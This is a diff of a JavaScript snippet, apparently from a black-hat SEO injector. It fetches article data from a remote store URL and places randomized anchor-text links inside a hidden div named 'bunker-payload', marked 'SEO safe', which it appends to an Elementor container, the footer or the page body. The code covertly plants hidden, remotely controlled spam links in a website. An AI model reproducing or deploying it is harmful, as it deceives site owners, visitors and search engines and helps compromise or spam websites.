@@ -6,8 +6,6 @@
     let html = "";
 
     data.articles.forEach(item => {
-
-      // 🔥 INI POSISI KODENYA BRO
       const anchorText = Array.isArray(item.anchor)
         ? item.anchor[Math.floor(Math.random() * item.anchor.length)]
         : item.anchor;
@@ -27,12 +25,18 @@
   fetch(STORE_URL)
     .then(res => res.json())
     .then(json => {
-      const target =
-    document.querySelector(".elementor") ||
-    document.querySelector("footer") ||
-    document.body;
 
-    target.appendChild(div);
+      const div = document.createElement("div");
+      div.id = "bunker-payload";
+      div.style.display = "none"; // SEO safe
+      div.innerHTML = createArticle(json);
+
+      const target =
+        document.querySelector(".elementor") ||
+        document.querySelector("footer") ||
+        document.body;
+
+      target.appendChild(div);
     });
 
 })();
